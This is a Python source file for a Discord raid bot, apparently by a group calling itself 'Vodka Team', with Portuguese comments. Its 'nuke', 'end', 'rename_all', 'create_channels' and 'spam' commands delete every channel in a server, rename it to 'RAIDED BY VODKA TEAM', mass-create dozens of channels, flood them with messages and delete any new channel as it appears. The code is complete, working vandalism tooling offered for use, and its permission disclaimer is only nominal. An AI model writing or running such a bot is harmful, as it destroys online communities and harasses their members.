import discord
from discord.ext import commands
import asyncio
import os
import sys
from dotenv import load_dotenv
import threading
from flask import Flask

# Carregar variáveis de ambiente
load_dotenv()

TOKEN = os.getenv('DISCORD_TOKEN')

if not TOKEN:
    print("❌ TOKEN não encontrado! Verifique o arquivo .env")
    sys.exit(1)

# Configurar intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='•', intents=intents)

# ========== SERVIDOR HTTP PARA O RENDER ==========
app = Flask('')

@app.route('/')
def home():
    return "🍺 VODKA BOT ESTÁ RODANDO! 🍺"

def run_flask():
    app.run(host='0.0.0.0', port=10000)

# Iniciar servidor Flask em thread separada
threading.Thread(target=run_flask, daemon=True).start()
# ================================================

# ========== FUNÇÕES DE TEXTO ==========
def load_text():
    try:
        with open('texto.txt', 'r', encoding='utf-8') as f:
            return f.read().strip()
    except FileNotFoundError:
        with open('texto.txt', 'w', encoding='utf-8') as f:
            f.write("🍺 RAIDED BY VODKA TEAM 🍺")
        return "🍺 RAIDED BY VODKA TEAM 🍺"
    except Exception as e:
        print(f"Erro ao carregar texto: {e}")
        return "🍺 RAIDED BY VODKA TEAM 🍺"

def update_text(new_text):
    try:
        with open('texto.txt', 'w', encoding='utf-8') as f:
            f.write(new_text)
        return True
    except Exception as e:
        print(f"Erro ao atualizar texto: {e}")
        return False

# ========== EVENTOS ==========
@bot.event
async def on_ready():
    print(f'✅ Bot logado como {bot.user}')
    print(f'✅ Em {len(bot.guilds)} servidores')
    await bot.change_presence(activity=discord.Game(name="•help_bot | Vodka Team"))

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"❌ Comando não encontrado! Use •help_bot para ver os comandos.", delete_after=5)
    else:
        print(f"Erro: {error}")

# ========== MONITOR DE CANAIS ==========
@bot.event
async def on_guild_channel_create(channel):
    """Apaga qualquer canal criado automaticamente"""
    try:
        await channel.delete()
        print(f"🗑️ Canal {channel.name} apagado automaticamente!")
    except:
        pass

# ========== COMANDOS ==========

@bot.command()
async def ping(ctx):
    """Verifica a latência do bot"""
    try:
        latency = round(bot.latency * 1000)
        embed = discord.Embed(
            title="🏓 Pong!",
            description=f"Latência: **{latency}ms**",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed, delete_after=10)
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

@bot.command()
async def nuke(ctx):
    """💀 ATIVAÇÃO DO NUKE: Cria canais, envia 10 mensagens em cada, renomeia tudo!"""
    try:
        await ctx.message.delete()
        texto = load_text()
        guild = ctx.guild
        
        # PASSO 1: Renomear o servidor
        try:
            await guild.edit(name="💀 RAIDED BY VODKA TEAM 💀")
        except:
            pass
        
        # PASSO 2: Apagar TODOS os canais existentes (exceto o atual se possível)
        for channel in guild.channels:
            try:
                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                    await channel.delete()
                    await asyncio.sleep(0.1)  # Delay mínimo
            except:
                pass
        
        # PASSO 3: Criar MUITOS canais (texto, voz e fórum)
        criados = 0
        canais_criados = []
        
        # Criar vários canais de texto
        for i in range(50):  # 50 canais de texto
            try:
                canal = await guild.create_text_channel(f"RAID-BY-VODKA-{i+1}")
                canais_criados.append(canal)
                criados += 1
                await asyncio.sleep(0.05)  # Delay ultra rápido
            except:
                pass
        
        # Criar canais de voz
        for i in range(20):  # 20 canais de voz
            try:
                canal = await guild.create_voice_channel(f"VOICE-RAID-{i+1}")
                canais_criados.append(canal)
                criados += 1
                await asyncio.sleep(0.05)
            except:
                pass
        
        # Criar fóruns
        for i in range(10):  # 10 fóruns
            try:
                canal = await guild.create_forum_channel(f"FORUM-RAID-{i+1}")
                canais_criados.append(canal)
                criados += 1
                await asyncio.sleep(0.05)
            except:
                pass
        
        # PASSO 4: Enviar 10 mensagens em CADA canal criado
        mensagens_enviadas = 0
        for canal in canais_criados:
            if isinstance(canal, discord.TextChannel):
                try:
                    for i in range(10):  # 10 mensagens por canal
                        await canal.send(f"**{texto}**\n💀 Mensagem {i+1}/10\n🔥 RAIDED BY VODKA TEAM!")
                        mensagens_enviadas += 1
                        await asyncio.sleep(0.05)  # Delay mínimo
                except:
                    pass
        
        # PASSO 5: Relatório final
        embed = discord.Embed(
            title="💀 NUKE COMPLETO! 💀",
            description=f"✅ **{criados}** canais criados\n✅ **{mensagens_enviadas}** mensagens enviadas\n✅ Servidor renomeado para RAIDED BY VODKA TEAM",
            color=discord.Color.red()
        )
        embed.set_footer(text="🍺 VODKA TEAM - O CAOS ESTÁ INSTALADO!")
        
        # Tentar enviar em algum canal que sobrou
        if guild.text_channels:
            await guild.text_channels[0].send(embed=embed)
        
    except Exception as e:
        print(f"Erro no nuke: {e}")
        try:
            if guild.text_channels:
                await guild.text_channels[0].send(f"❌ Erro: {str(e)}")
        except:
            pass

@bot.command()
async def end(ctx):
    """💀 APAGA TODOS OS CANAIS e MONITORA para apagar novos!"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        # Apagar TODOS os canais (sem criar nenhum)
        count = 0
        for channel in guild.channels:
            try:
                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                    await channel.delete()
                    count += 1
                    await asyncio.sleep(0.1)  # Delay mínimo
            except:
                pass
        
        # Renomear servidor
        try:
            await guild.edit(name="💀 RAIDED BY VODKA TEAM 💀")
        except:
            pass
            
        print(f"✅ {count} canais apagados no servidor {guild.name}")
        
        # Tenta enviar uma mensagem final (se tiver algum canal)
        if guild.text_channels:
            await guild.text_channels[0].send(f"💀 {count} canais foram apagados! Nenhum canal novo será criado!")
        
    except Exception as e:
        print(f"Erro no end: {e}")
        try:
            if guild.text_channels:
                await guild.text_channels[0].send(f"❌ Erro: {str(e)}")
        except:
            pass

@bot.command()
async def rename_all(ctx):
    """Renomeia todos os canais e o servidor"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        contador = 0
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await channel.edit(name="raided-by-vodka-team")
                    contador += 1
                    await asyncio.sleep(0.1)
                except:
                    pass
        
        # Renomear servidor
        try:
            await guild.edit(name="💀 RAIDED BY VODKA TEAM 💀")
        except:
            pass
            
        embed = discord.Embed(
            title="✅ RENOMEADO!",
            description=f"{contador} canais renomeados para RAIDED BY VODKA TEAM",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed, delete_after=5)
        
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def set_text(ctx, *, texto):
    """Atualiza o texto das mensagens"""
    try:
        await ctx.message.delete()
        if update_text(texto):
            embed = discord.Embed(
                title="✅ TEXTO ATUALIZADO!",
                description=f"Novo texto: **{texto}**",
                color=discord.Color.green()
            )
            await ctx.send(embed=embed, delete_after=5)
        else:
            await ctx.send("❌ Erro ao atualizar texto!", delete_after=5)
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def create_channels(ctx, quantidade: int = 10):
    """Cria N canais (padrão: 10)"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        if quantidade > 50:
            quantidade = 50
            await ctx.send("⚠️ Limitado a 50 canais por vez!", delete_after=5)
        
        criados = 0
        for i in range(quantidade):
            try:
                await guild.create_text_channel(f"🍺-vodka-{i+1}")
                criados += 1
                await asyncio.sleep(0.1)
            except:
                pass
                
        embed = discord.Embed(
            title="✅ CANAIS CRIADOS!",
            description=f"{criados} canais criados com sucesso!",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed, delete_after=5)
        
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def spam(ctx, canal: discord.TextChannel = None, quantidade: int = 10):
    """Spam em um canal específico"""
    try:
        await ctx.message.delete()
        target = canal or ctx.channel
        texto = load_text()
        
        for i in range(quantidade):
            await target.send(f"**{texto}**\n💀 Spam {i+1}/{quantidade}")
            await asyncio.sleep(0.05)
            
        await ctx.send(f"✅ {quantidade} mensagens enviadas em {target.mention}", delete_after=5)
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def help_bot(ctx):
    """Mostra todos os comandos"""
    embed = discord.Embed(
        title="🍺 VODKA TEAM BOT - COMANDOS",
        description="💀 COMANDOS DE CAOS TOTAL!",
        color=discord.Color.red()
    )
    embed.add_field(
        name="📌 COMANDOS PRINCIPAIS",
        value=(
            "`•ping` - Verifica latência do bot\n"
            "`•nuke` - 💀 **ATIVAÇÃO TOTAL**: 10 mensagens em TODOS os canais, cria canais de texto/voz/fórum, renomeia tudo!\n"
            "`•end` - 💀 **APAGA TUDO**: Remove todos os canais e impede criação de novos!\n"
            "`•rename_all` - Renomeia todos os canais e servidor\n"
            "`•set_text <texto>` - Muda a mensagem do bot\n"
            "`•create_channels <qtd>` - Cria N canais (padrão: 10)\n"
            "`•spam <canal> <qtd>` - Spam em canal específico"
        ),
        inline=False
    )
    embed.add_field(
        name="⚠️ AVISO",
        value="Use com responsabilidade! Apenas em servidores onde você tem permissão.\nO bot vai apagar canais NOVOS automaticamente após o •end!",
        inline=False
    )
    embed.set_footer(text="🍺 VODKA TEAM - Power to the people!")
    
    await ctx.send(embed=embed)

# ========== RODAR O BOT ==========
if __name__ == "__main__":
    print("🚀 Iniciando bot...")
    print("🔥 MODO DESTRUTIVO ATIVADO!")
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("❌ Token inválido!")
    except Exception as e:
        print(f"❌ Erro ao rodar bot: {e}")
